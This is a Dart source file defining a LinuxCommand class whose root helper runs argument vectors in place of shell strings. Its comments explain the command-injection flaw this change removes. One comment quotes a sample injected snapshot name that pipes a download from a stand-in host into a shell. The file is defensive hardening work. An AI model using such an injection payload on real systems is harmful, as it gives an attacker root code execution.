/// A single command in [Linux.commandQueue], executed by the root helper
/// `additional/python/run_multiple_commands.py`.
///
/// The command is an **argument vector**, not a command line. The previous
/// version carried a single string that the root helper handed to
/// `bash -c "..."`, so any value interpolated into it — a Timeshift snapshot
/// name read off a mounted disk, a mountpoint, a package name from a search
/// result, a download URL out of GitHub's JSON — was shell source code running
/// as root. Passing an argument vector removes the shell from the path
/// entirely: a snapshot called `foo"; curl evil | sh; #` is one argument.
class LinuxCommand {
  /// Defines the user, which will run the command. Has to be numeric.
  /// - '0' stands for root
  /// - '1000' for the normal user e.g.
  ///
  /// Linux.currentEnvironment.currentUserId can help.
  final int userId;

  /// Executable followed by its arguments. Never a command line.
  final List<String> argv;

  /// Merged over the inherited environment by the runner.
  final Map<String, String>? environment;

  // Used as explanation to users
  final String description;

  /// Runs the command through `bash -c` instead of executing it directly.
  ///
  /// Reserved for the few commands that genuinely need shell features — a
  /// pipeline, a redirection, two commands separated by `cd`. In that case
  /// `argv.first` is the script and the remaining entries are passed as `$1`,
  /// `$2`, … Values must go through those positional parameters; interpolating
  /// them into the script text reintroduces exactly the problem argv solves.
  final bool useShell;

  LinuxCommand({
    required this.userId,
    required this.argv,
    this.environment,
    this.description = "",
    this.useShell = false,
  }) : assert(argv.isNotEmpty, "a command needs at least an executable");

  Map<String, dynamic> toJson() => {
        "uid": userId,
        "argv": argv,
        "env": environment ?? const <String, String>{},
        "shell": useShell,
      };

  /// Rendering for the command table the user can unfold before confirming.
  ///
  /// Presentation only — nothing parses this back. The environment is part
  /// of the command the queue will run, so it is rendered in front of it
  /// (`env KEY=VALUE …`) instead of staying invisible in the table.
  String get displayCommand {
    final String command = useShell
        ? (argv.length == 1
            ? "bash -c ${_quoted(argv.first)}"
            : "bash -c ${_quoted(argv.first)} -- ${argv.skip(1).map(_quoted).join(" ")}")
        : argv.map(_quoted).join(" ");
    final Map<String, String> env = environment ?? const <String, String>{};
    if (env.isEmpty) {
      return command;
    }
    final String assignments =
        env.entries.map((e) => _quoted("${e.key}=${e.value}")).join(" ");
    return "env $assignments $command";
  }

  static final RegExp _needsQuoting = RegExp(r'[^A-Za-z0-9_@%+=:,./-]');

  static String _quoted(String argument) {
    if (argument.isEmpty) {
      return "''";
    }
    if (!_needsQuoting.hasMatch(argument)) {
      return argument;
    }
    return "'${argument.replaceAll("'", r"'\''")}'";
  }

  @override
  String toString() => displayCommand;
}
